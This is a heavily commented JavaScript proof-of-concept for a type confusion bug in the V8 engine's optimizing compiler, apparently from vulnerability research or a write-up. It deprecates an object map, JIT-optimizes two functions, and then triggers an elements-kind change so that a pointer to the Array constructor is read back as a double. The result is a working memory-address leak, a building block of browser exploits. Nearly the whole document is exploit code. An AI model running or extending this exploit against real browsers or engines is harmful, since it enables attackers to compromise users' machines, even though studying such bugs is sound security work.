// The function that will be optimized to change elements kind. Could be called the “evil” function.
function change_elements_kind(a){
	a[0] = Array;
}
// The function that will be optimized to read values directly as unboxed (and will therefore read pointers as values). Could also be called the “evil” function.
function read_as_unboxed(){
    return evil[0];
}
// First, we want to make the function compile. Call it.
//    %DebugPrint({});
change_elements_kind({});
// Construct a new object. Let’s call it’s map M0.
map_manipulator = new Array(1.0,2.3);
// We add the property ‘x’. M0 will now have an ‘x’ transition to the new one, M1.
map_manipulator.x = 7;
//%DebugPrint(map_manipulator);
//%SystemBreak();
// Call the function with this object. A version of the function for this M1 will be compiled.
//    %DebugPrint(map_manipulator);
change_elements_kind(map_manipulator);
//%/DebugPrint(map_manipulator);
//%SystemBreak();
// Change the object’s ‘x’ property type. The previous ‘x’ transition from M0 to M1 will be removed, and M1 will be deprecated. A new map, M2, with a new ‘x’ transition from M0 is generated.
map_manipulator.x = {};
//%DebugPrint(map_manipulator);
// Generate the object we’ll use for the vulnerability. Make sure it is of the M2 map.
evil = new Array(1.1,2.2);
evil.x = {};
//%DebugPrint(evil);
x = new Array({});
// Optimize change_elements_kind.
// ReduceElementAccess will be called, and it will in turn call ComputeElementAccessInfos. In the code
// snippet below (same as before), we can see that the code runs through all the maps (Note: these are 
// maps that have already been used in this function and compiled), and tries to update each of them.
// When reaching M1, TryUpdate will see that it’s deprecated and look for a suitable non-deprecated
// map, and will find M2, since it has the same properties. Therefore, an elements kind transition will be
// created from M2.
//    %DebugPrint(x);
for(var i = 0;i<0x50000;i++){
    change_elements_kind(x);
}
// Optimize read_as_unboxed. Evil is currently an instance of the M2 map, so the function will be
// optimized for that, and for fast element access (evil only holds unboxed numbered properties).
for(var i = 0;i<0x50000;i++){
    read_as_unboxed();
}
// Trigger an elements kind change on evil. Since change_elements_kind was optimized with an
// elements kind transition, evil’s map will only be changed to reflect the new elements kind.
//%SystemBreak();
%DebugPrint(evil);
change_elements_kind(evil);
%DebugPrint(evil);
// Call read_as_unboxed. It’s still the same M2 so a cache miss does not occur, and the optimized
// version is executed. However, that version assumes that the values in the elements array are unboxed
// so the Array constructor pointer (stored at position 0 in change_elements_kind) will be returned as a
// double.
print(read_as_unboxed());
//map_manipulato = new Array(1.0,2.3);
// We add the property ‘x’. M0 will now have an ‘x’ transition to the new one, M1.
//map_manipulato.x = 7;
//%DebugPrint(map_manipulato);
